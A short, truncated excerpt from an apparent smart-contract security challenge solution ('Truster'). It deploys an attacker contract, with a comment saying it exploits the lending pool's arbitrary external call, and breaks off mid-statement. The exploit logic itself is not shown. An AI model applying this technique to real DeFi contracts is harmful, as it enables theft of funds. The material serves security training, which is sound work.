...
const TrusterLenderPoolJSON = require("../../artifacts/contracts/truster/TrusterLenderPool.sol/TrusterLenderPool.json");
...
describe("[Challenge] Truster", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The exploit is made by a malicious contract that use the arbitrary external call that the pool has
     */
    const TrusterAttacker = await ethers.getContractFactory("TrusterAttacker");
    const trusterAttacker = await TrusterAttacker.deploy();
    await trusterAttacker.deployed();

    await trusterAttacker
      .connect(attacker)
